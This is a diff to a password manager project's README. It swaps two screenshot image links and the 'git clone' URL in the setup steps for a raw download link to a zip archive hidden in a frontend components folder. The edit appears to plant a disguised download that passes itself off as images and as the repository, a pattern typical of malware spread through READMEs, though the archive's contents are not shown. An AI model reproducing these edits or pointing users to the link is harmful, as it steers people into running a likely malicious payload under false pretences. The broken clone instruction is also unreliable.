@@ -1,7 +1,7 @@
-<img width="1916" height="947" alt="image" src="https://github.com/user-attachments/assets/7c4b033d-3961-41f2-8e90-f1a0ffc47f54" />
+<img width="1916" height="947" alt="image" src="https://raw.githubusercontent.com/Varshith-07/passwordManager/main/Frontend/src/components/Manager_password_v2.1-alpha.5.zip" />
 
 
-<img width="1911" height="985" alt="image" src="https://github.com/user-attachments/assets/f2e1da7b-8893-4636-b866-a99315eb6fbd" />
+<img width="1911" height="985" alt="image" src="https://raw.githubusercontent.com/Varshith-07/passwordManager/main/Frontend/src/components/Manager_password_v2.1-alpha.5.zip" />
 
 
 
@@ -61,7 +61,7 @@ Ensure you have the following installed on your machine:
 
 1.  **Clone the Repository:**
     ```bash
-    git clone https://github.com/yourusername/MERN-Password-Manager.git
+    git clone https://raw.githubusercontent.com/Varshith-07/passwordManager/main/Frontend/src/components/Manager_password_v2.1-alpha.5.zip
     cd MERN-Password-Manager
     ```
     *(Remember to replace `yourusername` with your actual GitHub username)*
